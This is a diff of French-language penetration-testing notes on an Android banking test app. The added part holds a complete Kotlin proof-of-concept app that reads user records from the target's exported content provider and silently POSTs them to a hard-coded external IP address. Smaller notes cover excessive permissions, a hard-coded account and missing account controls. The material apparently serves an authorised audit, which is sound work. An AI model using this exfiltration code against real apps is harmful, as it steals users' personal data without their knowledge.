@@ -150,23 +150,64 @@ ffuf -w /Users/tdutrey/Documents/tools/Wordlist/SecLists/Usernames/top-usernames
 
 ## Pentest APK
 
-### Manifest.xml mal configuré:
-
-#### Mode debug activé
-
-![[Pasted image 20260317103940.png]]
-![[Pasted image 20260317103949.png]]
-
-#### Mode backup activé
-
-![[Pasted image 20260317104446.png]]
-![[Pasted image 20260317104457.png]]
 
 #### Trop de permission sont données à l'app
 
 ![[Pasted image 20260317105008.png]]
 
+![[Pasted image 20260320151747.png]]
 
+```java
+package com.example.auditxmco  
+  
+import android.net.Uri  
+import android.os.Bundle  
+import androidx.activity.ComponentActivity  
+import java.net.HttpURLConnection  
+import java.net.URL  
+  
+class MainActivity : ComponentActivity() {  
+    override fun onCreate(savedInstanceState: Bundle?) {  
+        super.onCreate(savedInstanceState)  
+  
+        val uri = Uri.parse(  
+            "content://com.android.xmcodroidbank.TrackUserContentProvider/trackerusers"  
+        )  
+  
+        val cursor = contentResolver.query(uri, null, null, null, null)  
+        val data = StringBuilder()  
+  
+        cursor?.use {  
+            while (it.moveToNext()) {  
+                data.append(it.getString(1)).append("\n")  
+            }  
+        }  
+  
+        Thread {  
+            try {  
+                val conn = URL("http://212.129.9.19:5555")  
+                    .openConnection() as HttpURLConnection  
+  
+                conn.requestMethod = "POST"  
+                conn.doOutput = true  
+  
+                conn.outputStream.use { os ->  
+                    os.write(data.toString().toByteArray())  
+                }  
+  
+                conn.responseCode // trigger request  
+  
+            } catch (_: Exception) {}  
+        }.start()  
+  
+        finish()  
+    }  
+}
+```
+
+![[Pasted image 20260320151817.png]]
+
+![[Pasted image 20260320151843.png]]
 
 ### Compte Hard codé dans l'app (DoLogin)
 
@@ -224,3 +265,4 @@ Puis il y a pas de controle de l'utilisateur:
 ![[Pasted image 20260319170545.png]]
 
 N importe qui peut donc créer un compte
+
